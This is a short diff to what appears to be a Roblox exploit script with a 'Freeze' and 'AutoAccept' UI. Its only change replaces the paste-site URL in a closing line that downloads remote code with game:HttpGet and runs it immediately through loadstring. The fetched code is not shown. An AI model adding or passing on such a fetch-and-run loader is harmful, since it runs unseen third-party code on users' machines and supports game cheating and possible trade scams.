@@ -261,4 +261,4 @@ setKnobState(autoKnob, getgenv().CODERJOEY_AUTO)
 safeParent(screen)
 
 print("[CoderJoey] Draggable UI loaded. Freeze:", getgenv().CODERJOEY_FREEZE, " AutoAccept:", getgenv().CODERJOEY_AUTO)
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/blVheMQLDL/0", true))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/H5erDublLn/0", true))()
